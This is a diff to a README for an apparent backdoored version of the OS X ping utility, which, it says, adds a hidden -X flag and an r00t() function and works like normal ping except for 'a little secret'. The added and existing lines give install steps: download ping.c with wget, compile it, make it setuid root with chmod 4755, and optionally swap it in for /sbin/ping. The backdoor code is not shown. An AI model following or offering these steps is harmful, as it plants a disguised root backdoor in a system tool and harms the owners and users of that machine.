@@ -5,8 +5,11 @@ This is just the normal OS X `ping`, but if you run it with the flag `-X`, it dr
 
 I didn't write the `ping` utility, this is just the normal OS X `ping`, the source code of which can be found [here](http://www.opensource.apple.com/source/network_cmds/network_cmds-329.2/ping.tproj/ping.c?txt). All I did was add the `-X` flag and the function `r00t()`.
 
+This program still works like the normal `ping`. It just has a little secret 😉
+
 # Compilation & Installation
 
+1. `wget https://raw.githubusercontent.com/raincoats/osx-ping-backdoor/master/ping.c`
 1. `gcc ping.c -o ping`
 2. (as root) `chown root:wheel ./ping; chmod 4755 ./ping`
 3. Optionally, `mv /sbin/ping{,-backup} && mv ./ping /sbin`
